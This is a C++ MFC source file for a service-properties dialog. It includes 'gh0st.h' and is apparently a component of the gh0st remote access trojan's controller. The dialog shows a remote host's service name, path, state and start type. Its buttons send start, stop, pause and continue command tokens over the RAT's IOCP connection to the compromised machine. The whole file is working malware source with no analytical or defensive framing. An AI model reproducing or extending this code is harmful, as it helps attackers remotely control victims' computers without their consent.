// ServiceInfoDlg.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "ServiceInfoDlg.h"
#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CServiceInfoDlg dialog


CServiceInfoDlg::CServiceInfoDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CServiceInfoDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CServiceInfoDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_hIcon = (HICON)::LoadImage(::AfxGetInstanceHandle(),MAKEINTRESOURCE(IDI_ICONSERVICE), IMAGE_ICON, 20, 20, 0);

}


void CServiceInfoDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CServiceInfoDlg)
	DDX_Control(pDX, IDC_COMBO_RUNWAY, m_combox_runway);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CServiceInfoDlg, CDialog)
	//{{AFX_MSG_MAP(CServiceInfoDlg)
	ON_CBN_SELCHANGE(IDC_COMBO_RUNWAY, OnSelchangeComboRunway)
	ON_BN_CLICKED(IDC_BUTTON_START, OnButtonStart)
	ON_BN_CLICKED(IDC_BUTTON_STOP, OnButtonStop)
	ON_BN_CLICKED(IDC_BUTTON_PAUSE, OnButtonPause)
	ON_BN_CLICKED(IDC_BUTTON_CONTINUE, OnButtonContinue)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CServiceInfoDlg message handlers

BOOL CServiceInfoDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here

	m_combox_runway.InsertString(0,"自动"); // 0
	m_combox_runway.InsertString(1,"手动"); // 1
	m_combox_runway.InsertString(2,"已禁用"); // 2

	SetDlgItemText(IDC_EDIT_SERNAME,m_ServiceInfo.strSerName);
	SetDlgItemText(IDC_EDIT_SERDISPLAYNAME,m_ServiceInfo.strSerDisPlayname);
	SetDlgItemText(IDC_EDIT_SERDESCRIPTION,m_ServiceInfo.strSerDescription);
	SetDlgItemText(IDC_EDIT_FILEPATH,m_ServiceInfo.strFilePath);
	SetDlgItemText(IDC_STATIC_TEXT,m_ServiceInfo.strSerState);

	
	if(m_ServiceInfo.strSerRunway == "Disabled")
		m_combox_runway.SetCurSel(2);
	else if (m_ServiceInfo.strSerRunway == "Demand Start")
		m_combox_runway.SetCurSel(1);
	else
		m_combox_runway.SetCurSel(0);


	SetWindowText(m_ServiceInfo.strSerDisPlayname + "的属性");

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CServiceInfoDlg::OnSelchangeComboRunway() 
{
	// TODO: Add your control notification handler code here
	GetDlgItem(IDC_BUTTON_USE)->EnableWindow(TRUE);
}

void CServiceInfoDlg::OnButtonStart() 
{
	// TODO: Add your control notification handler code here
	SendToken(COMMAND_STARTSERVERICE);
}

void CServiceInfoDlg::SendToken(BYTE bToken)
{
	int nPacketLength = (m_ServiceInfo.strSerName.GetLength() + 1);;
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpBuffer[0] = bToken;
	
	memcpy(lpBuffer + 1, m_ServiceInfo.strSerName.GetBuffer(0), m_ServiceInfo.strSerName.GetLength());
	m_iocpServer->Send(m_pContext, lpBuffer, nPacketLength, TRUE);
	LocalFree(lpBuffer);
}

void CServiceInfoDlg::OnButtonStop() 
{
	// TODO: Add your control notification handler code here
	SendToken(COMMAND_STOPSERVERICE);
}

void CServiceInfoDlg::OnButtonPause() 
{
	// TODO: Add your control notification handler code here
	SendToken(COMMAND_PAUSESERVERICE);
}

void CServiceInfoDlg::OnButtonContinue() 
{
	// TODO: Add your control notification handler code here
	SendToken(COMMAND_CONTINUESERVERICE);
}
